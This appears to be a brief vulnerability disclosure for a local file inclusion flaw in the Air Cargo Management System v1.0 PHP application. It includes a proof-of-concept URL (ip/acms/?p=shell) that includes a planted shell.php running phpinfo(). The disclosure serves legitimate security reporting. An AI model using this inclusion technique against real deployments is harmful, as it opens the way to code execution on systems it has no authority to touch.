# Air Cargo Management System v1.0 by oretnom23 has The local file contains

vendors: https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html

Vulnerability File: ip/acms/?p=

Vulnerability location: ip/acms/?p=, p

Payload: ip/acms/?p=shell


![image](https://user-images.githubusercontent.com/54017627/166401037-9b3e7eb4-521c-40a7-ba93-d7c332131646.png)

We create a shell.php under the PHP file of the root of the website, which reads "<?" phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/166400989-1e0d7bf7-0a3b-4644-8b23-83965140409b.png)


And visit http://ip/acms/?p=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/166401259-0d36959f-5dbe-461e-be29-afb98d6bfad6.png)

